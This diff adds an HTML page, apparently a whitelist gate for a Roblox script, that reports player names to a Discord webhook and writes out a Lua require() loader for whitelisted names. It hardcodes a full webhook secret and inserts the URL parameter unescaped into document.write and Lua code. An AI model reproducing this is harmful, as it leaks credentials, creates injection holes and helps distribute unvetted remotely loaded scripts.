@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Webhook Proxy</title>
+</head>
+<body>
+    <script>
+        // Konfigurasi
+        const whitelist = ["debugtestname", "hafiez1234567890", "BANERA_666"];
+        const requireScriptID = 10868847330;
+        const webhookUrl = "https://discord.com/api/webhooks/1347916360407060522/qLuiXsR8FsyWPaB7igBWZ1H0rcb8QIE841_wH4VR4R10yfp4V5lWzjtPh0LnnCsDLdr7";
+
+        // Ambil nama player dari URL
+        const params = new URLSearchParams(window.location.search);
+        if (params.has("player")) {
+            const player = params.get("player");
+            let isWhitelisted = whitelist.includes(player);
+
+            // Kirim data ke Discord Webhook
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    "embeds": [{
+                        "title": "**Player Joined:** " + player,
+                        "description": "**Status:** " + (isWhitelisted ? "✅ Whitelisted" : "❌ Not Whitelisted"),
+                        "color": isWhitelisted ? 65280 : 16711680
+                    }]
+                })
+            });
+
+            // Jika whitelisted, jalankan require script (dikembalikan sebagai respon)
+            if (isWhitelisted) {
+                document.write(`
+                    local scriptID = ${requireScriptID}
+                    local success, result = pcall(function()
+                        return require(scriptID):pls("${player}")
+                    end)
+                `);
+            } else {
+                document.write("denied");
+            }
+        }
+    </script>
+</body>
+</html>
